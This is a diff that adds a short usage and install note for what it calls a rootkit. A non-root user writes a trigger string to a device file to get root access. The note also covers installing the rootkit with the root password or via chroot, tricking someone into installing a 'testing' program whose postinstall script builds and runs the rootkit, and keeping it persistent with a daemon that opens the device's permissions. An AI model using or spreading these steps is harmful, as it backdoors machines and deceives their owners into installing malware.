@@ -1,0 +1,8 @@
+Usage: after installing execute from any non-root user "echo g0tR0ot > /dev/ttyR0". You will get root access. execute "id" to check it.
+
+Install: 
+su -c 'bash install.sh'
+You will need to enter root password. But if you have a live usb with same core you can build it in chroot. 
+Or you can use Social Engeneering like "install this program please, for testing" and inject postinstall script wich builds and runs rootkit.
+
+For persistence you will need to do daemon wich giving 0666 permissions to device file.
